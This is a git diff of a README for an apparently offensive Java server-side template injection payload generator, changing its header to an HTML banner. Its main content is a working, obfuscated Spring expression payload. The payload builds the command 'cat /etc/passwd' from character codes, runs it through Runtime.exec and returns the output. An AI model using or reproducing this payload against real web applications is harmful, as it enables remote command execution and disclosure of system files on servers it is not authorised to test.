@@ -1,5 +1,12 @@
-SSTI Payload Generator
-======================
+
+<h1 align="center">
+  <br>
+  <a href="https://github.com/mez0cc/ssti-payload"><img src="https://i.imgur.com/hoi1frW.jpg" alt="shells"></a>
+  <br>
+  SSTI Payload Generator
+  <br>
+</h1>
+
 This generator is for a specific type of Java SSTI, inspired by the following [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java):
 
 ```${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}```
